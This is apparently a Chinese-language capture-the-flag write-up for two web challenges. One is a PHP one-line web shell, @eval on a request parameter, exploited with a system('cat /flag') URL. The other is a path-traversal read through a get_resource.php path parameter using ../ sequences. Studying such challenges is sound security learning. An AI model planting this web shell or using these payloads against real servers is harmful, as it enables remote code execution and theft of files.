# 跑马场

```php
<?php 

// 真正的强者，敢于把自己的马送给别人
highlight_file(__FILE__);

@eval($_REQUEST['dc64c146a42ea65baf7b5a7d64a50972']);
```

## 代码分析

#### 1. `highlight_file(__FILE__);`

- **作用**：将当前 PHP 文件（即包含此代码的文件）的源代码以 HTML 高亮形式显示给用户。

#### 2. `@eval($_REQUEST['dc64c146a42ea65baf7b5a7d64a50972']);`

- **关键点拆解**：
  - `@`：PHP 的**错误抑制符**，用于隐藏代码执行过程中的错误信息。这会让调试变得困难，但也增加了漏洞利用的隐蔽性。
  - `eval()`：PHP 的内置函数，用于**执行任意 PHP 代码**（字符串形式）。例如：`eval('echo "Hello";');` 会直接输出 `Hello`。
  - `$_REQUEST`：PHP 的**超全局变量**，同时接收来自 GET、POST 或 COOKIE 的参数。
  - `dc64c146a42ea65baf7b5a7d64a50972`：参数名，可能是随机生成或经过哈希处理的，用于混淆，但本质上就是一个普通的参数名（如`?param=value`中的`param`）。

## 漏洞利用

​	`eval(phpcode)`通过eval()函数我们可以向其中注入执行任意php代码。通过分析上面的eval函数中传入了一个超全局变量，param名称为`dc64c146a42ea65baf7b5a7d64a50972`，我们可以构造`https://hostname.com/?dc64c146a42ea65baf7b5a7d64a50972=system("cat /flag")`来执行ls命令并看到输出结果

## 补充

### PHP 超级全局变量

​	PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。

PHP 超级全局变量列表:

- $GLOBALS
- $_SERVER
- $_REQUEST
- $_POST
- $_GET
- $_FILES
- $_ENV
- $_COOKIE
- $_SESSION

# 音乐会

```html
<img src="/get_resource.php?path=static/img/1.jpg">
```

## 代码分析

​	在这到题目中我们可以看见在页面HTML中，通过`get_resource.php`获取到了图片内容并显示到前端中，其中传入的参数为`path`，其值为相对路径。

## 漏洞利用

​	我们可以通过访问`https://hostname.com/get_resource.php?path=flagpath`来获取到flag内容

## 补充

​	我们很难通过相对路径来确定绝对路径，所以我们通过添加../../../../../../../，一直返回到根目录，来获取flag路径。
